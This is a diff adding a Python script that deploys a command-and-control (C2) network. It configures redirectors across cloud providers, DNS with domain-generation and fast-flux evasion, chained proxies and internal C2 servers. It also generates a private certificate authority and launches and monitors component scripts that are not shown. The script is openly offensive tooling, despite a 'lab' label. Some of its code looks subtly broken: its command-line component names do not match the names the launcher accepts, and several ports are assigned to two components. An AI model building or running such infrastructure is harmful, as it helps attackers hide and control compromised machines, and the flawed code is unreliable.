@@ -1,0 +1,301 @@
+# deploy_infrastructure.py
+"""
+Deployment script for the complete C2 infrastructure
+"""
+
+import subprocess
+import yaml
+import json
+import sys
+import os
+from pathlib import Path
+import time
+import argparse
+
+class C2InfrastructureDeployer:
+    """Deploys the complete C2 infrastructure"""
+    
+    def __init__(self, config_file: str = "infrastructure_config.yaml"):
+        self.config_file = config_file
+        self.config = self.load_config()
+        self.processes = []
+        
+    def load_config(self) -> dict:
+        """Load configuration from YAML file"""
+        config_template = {
+            'infrastructure': {
+                'name': 'Advanced C2 Infrastructure',
+                'environment': 'lab',
+                'cloud_providers': ['AWS', 'Azure', 'DigitalOcean'],
+                'region': 'us-east-1'
+            },
+            'components': {
+                'redirectors': {
+                    'count': 3,
+                    'ports': [443, 8443, 9443],
+                    'cloud_providers': ['AWS', 'Cloudflare', 'Azure']
+                },
+                'dns': {
+                    'primary': '10.0.1.10',
+                    'secondary': '10.0.1.11',
+                    'dga_enabled': True,
+                    'fast_flux': True
+                },
+                'proxy_chains': {
+                    'count': 3,
+                    'hops_per_chain': 3,
+                    'types': ['socks5', 'http', 'https']
+                },
+                'c2_servers': {
+                    'count': 2,
+                    'framework': 'FastAPI',
+                    'internal_only': True,
+                    'ports': [8443, 9443]
+                }
+            },
+            'security': {
+                'encryption': 'AES-256-GCM',
+                'authentication': 'JWT',
+                'rate_limiting': True,
+                'ip_whitelisting': True
+            },
+            'monitoring': {
+                'enabled': True,
+                'dashboard': True,
+                'alerting': True,
+                'logging_level': 'INFO'
+            }
+        }
+        
+        if os.path.exists(self.config_file):
+            with open(self.config_file, 'r') as f:
+                return yaml.safe_load(f)
+        else:
+            # Create default config
+            with open(self.config_file, 'w') as f:
+                yaml.dump(config_template, f, default_flow_style=False)
+            return config_template
+    
+    def generate_ssl_certificates(self):
+        """Generate SSL certificates for infrastructure"""
+        print("Generating SSL certificates...")
+        
+        cert_dir = Path("certs")
+        cert_dir.mkdir(exist_ok=True)
+        
+        # Generate CA
+        ca_cmd = [
+            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
+            '-keyout', 'certs/ca-key.pem',
+            '-out', 'certs/ca-cert.pem',
+            '-days', '365',
+            '-subj', '/CN=C2 Infrastructure CA',
+            '-nodes'
+        ]
+        
+        subprocess.run(ca_cmd, capture_output=True)
+        
+        # Generate server certificates
+        for server in ['redirector', 'c2-server', 'proxy']:
+            # Create CSR
+            csr_cmd = [
+                'openssl', 'req', '-newkey', 'rsa:2048',
+                '-keyout', f'certs/{server}-key.pem',
+                '-out', f'certs/{server}-csr.pem',
+                '-subj', f'/CN={server}.internal.c2',
+                '-nodes'
+            ]
+            
+            # Sign with CA
+            sign_cmd = [
+                'openssl', 'x509', '-req',
+                '-in', f'certs/{server}-csr.pem',
+                '-CA', 'certs/ca-cert.pem',
+                '-CAkey', 'certs/ca-key.pem',
+                '-out', f'certs/{server}-cert.pem',
+                '-days', '365',
+                '-CAcreateserial'
+            ]
+            
+            subprocess.run(csr_cmd, capture_output=True)
+            subprocess.run(sign_cmd, capture_output=True)
+        
+        print("SSL certificates generated in certs/ directory")
+    
+    def start_component(self, component: str, config: dict):
+        """Start a specific infrastructure component"""
+        print(f"Starting {component}...")
+        
+        if component == 'orchestrator':
+            cmd = [sys.executable, 'infrastructure_orchestrator.py']
+        elif component == 'redirector':
+            port = config.get('port', 443)
+            cmd = [sys.executable, 'cloud_redirector.py', '--port', str(port)]
+        elif component == 'dns':
+            cmd = [sys.executable, 'dns_infrastructure.py']
+        elif component == 'proxy_chain':
+            cmd = [sys.executable, 'proxy_chain.py']
+        elif component == 'c2_server':
+            port = config.get('port', 8443)
+            cmd = [sys.executable, 'internal_c2_server.py', '--port', str(port)]
+        else:
+            print(f"Unknown component: {component}")
+            return
+        
+        # Start process
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        self.processes.append((component, process))
+        print(f"  Started {component} (PID: {process.pid})")
+        
+        # Wait a bit for startup
+        time.sleep(2)
+    
+    def deploy_infrastructure(self):
+        """Deploy the complete infrastructure"""
+        print("=" * 60)
+        print("DEPLOYING ADVANCED C2 INFRASTRUCTURE")
+        print("=" * 60)
+        
+        # Generate certificates
+        self.generate_ssl_certificates()
+        
+        # Start infrastructure orchestrator
+        self.start_component('orchestrator', {})
+        
+        # Start DNS infrastructure
+        dns_config = self.config['components']['dns']
+        self.start_component('dns', dns_config)
+        
+        # Start redirectors
+        redirector_config = self.config['components']['redirectors']
+        for i in range(redirector_config['count']):
+            config = {
+                'port': redirector_config['ports'][i % len(redirector_config['ports'])],
+                'cloud_provider': redirector_config['cloud_providers'][i % len(redirector_config['cloud_providers'])]
+            }
+            self.start_component('redirector', config)
+        
+        # Start proxy chains
+        proxy_config = self.config['components']['proxy_chains']
+        for i in range(proxy_config['count']):
+            self.start_component('proxy_chain', {})
+        
+        # Start C2 servers
+        c2_config = self.config['components']['c2_servers']
+        for i in range(c2_config['count']):
+            config = {
+                'port': c2_config['ports'][i % len(c2_config['ports'])]
+            }
+            self.start_component('c2_server', config)
+        
+        print("\n" + "=" * 60)
+        print("DEPLOYMENT COMPLETE")
+        print("=" * 60)
+        
+        # Show summary
+        self.show_deployment_summary()
+        
+        # Monitor processes
+        self.monitor_processes()
+    
+    def show_deployment_summary(self):
+        """Show deployment summary"""
+        summary = {
+            'Infrastructure Name': self.config['infrastructure']['name'],
+            'Environment': self.config['infrastructure']['environment'],
+            'Cloud Providers': ', '.join(self.config['infrastructure']['cloud_providers']),
+            'Redirectors Deployed': self.config['components']['redirectors']['count'],
+            'DNS Servers': 2,  # Primary + Secondary
+            'Proxy Chains': self.config['components']['proxy_chains']['count'],
+            'C2 Servers': self.config['components']['c2_servers']['count'],
+            'Security': self.config['security']['encryption'],
+            'Monitoring': 'Enabled' if self.config['monitoring']['enabled'] else 'Disabled'
+        }
+        
+        print("\nDEPLOYMENT SUMMARY:")
+        print("-" * 40)
+        for key, value in summary.items():
+            print(f"{key:25}: {value}")
+        
+        print("\nACCESS POINTS:")
+        print("-" * 40)
+        print("Infrastructure Orchestrator: http://localhost:8000")
+        print("Redirector 1: https://localhost:443")
+        print("Redirector 2: https://localhost:8443")
+        print("C2 TeamServer: https://localhost:9443")
+        print("DNS Server: udp://localhost:53")
+        print("\nUse Ctrl+C to stop all components")
+    
+    def monitor_processes(self):
+        """Monitor running processes"""
+        try:
+            while True:
+                time.sleep(5)
+                
+                # Check if any processes died
+                dead_processes = []
+                for name, process in self.processes:
+                    if process.poll() is not None:
+                        dead_processes.append((name, process))
+                        print(f"\n⚠️  Process {name} (PID: {process.pid}) died!")
+                        stdout, stderr = process.communicate()
+                        if stderr:
+                            print(f"Error output:\n{stderr}")
+                
+                # Remove dead processes
+                for dead in dead_processes:
+                    self.processes.remove(dead)
+                
+                if not self.processes:
+                    print("\nAll processes have stopped.")
+                    break
+                    
+        except KeyboardInterrupt:
+            print("\n\nShutting down infrastructure...")
+            self.shutdown()
+    
+    def shutdown(self):
+        """Shutdown all running processes"""
+        print("Stopping all components...")
+        
+        for name, process in self.processes:
+            print(f"  Stopping {name} (PID: {process.pid})...")
+            process.terminate()
+            try:
+                process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                process.kill()
+        
+        print("Infrastructure shutdown complete.")
+
+def main():
+    parser = argparse.ArgumentParser(description="Deploy C2 Infrastructure")
+    parser.add_argument('--config', default='infrastructure_config.yaml',
+                       help='Configuration file')
+    parser.add_argument('--generate-certs', action='store_true',
+                       help='Generate SSL certificates only')
+    parser.add_argument('--component', choices=['orchestrator', 'redirector', 'dns', 'proxy', 'c2'],
+                       help='Start single component')
+    
+    args = parser.parse_args()
+    
+    deployer = C2InfrastructureDeployer(args.config)
+    
+    if args.generate_certs:
+        deployer.generate_ssl_certificates()
+    elif args.component:
+        # Start single component
+        deployer.start_component(args.component, {})
+        deployer.monitor_processes()
+    else:
+        # Deploy complete infrastructure
+        deployer.deploy_infrastructure()
+
+if __name__ == "__main__":
+    main()
